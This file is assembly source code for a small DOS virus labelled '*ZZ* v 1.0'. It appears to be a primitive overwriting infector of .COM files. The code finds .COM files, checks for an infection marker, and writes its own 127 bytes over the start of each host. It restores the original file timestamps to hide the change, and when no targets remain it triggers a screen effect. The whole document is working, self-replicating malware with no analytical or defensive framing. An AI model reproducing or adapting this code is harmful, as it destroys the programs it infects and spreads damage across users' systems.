


code  segment
      assume  cs:code, ds:code, es:code, ss:nothing

	org     0100h


start:  db      8Bh,0DBh   

	mov     ah,4Eh                  ;find a file               
	mov     cx,0000h                ;
	mov     dx,offset filemask      ;load searchmask, .COM     

loopy:  int     21h
				  
	jb      effect                  ;no files, do effect     
	call    infect                  

	jnz     exit  
	mov     ah,4Fh                  ;find next file
	jmp     short loopy
	      ;keep looping around

exit:   mov     ax,4C00h   
	int     21h            
effect: mov     ax,0040h                ;no files to infect       
	mov     es,ax                   ;slant the text on the screen
	mov     di,004Ah                                           
	mov     al,51h                                            
	stosb                                       
	int     20h                     ;and exit   

infect: mov     ax,3D02h                ;open host, r/w with handle
	mov     dx,009Eh                

	int     21h                     
	xchg    ax,bx                   ;exchange handle to ax
	mov     ah,3Fh                  ;read from file
	mov     cx,0002h                ;two bytes
	mov     dx,offset ID            ;put them in ID buffer

	int     21h                     
	cmp     Word Ptr ds:[016Dh],0DB8Bh
					;compare with virus ID
	pushf                           
	jz      close_file
	cwd                             
	mov     cx,dx                   ;
	mov     ax,4200h                ;reset file pointer
					;to beginning of file
	int     21h                                               
	mov     al,00h                  ;
	mov     ah,57h                  ;get file date/time

	int     21h                     ;
	push    cx                      ;store them
	push    dx                      ;
	mov     ah,40h                  ;write virus
	mov     cx,007Fh                ;to file
	mov     dx,0100h                ;start at beginning

	int     21h                     ;
	mov     al,01h                  ;restore file date/time
	pop     dx                      ;from the stack
	pop     cx                      ;
	mov     ah,57h                  ;
	int     21h                     ;
close_file: 

	mov     ah,3Eh                  ;close file
	int     21h                     ;
	popf                            ;
	ret                             ;exit     


ID:              dw      0000h                   
filemask:        db      "*.COM"         ;searchmask
		 db      00h                     
		 db      "*ZZ* v 1.0"   

code    ends
	end     start 

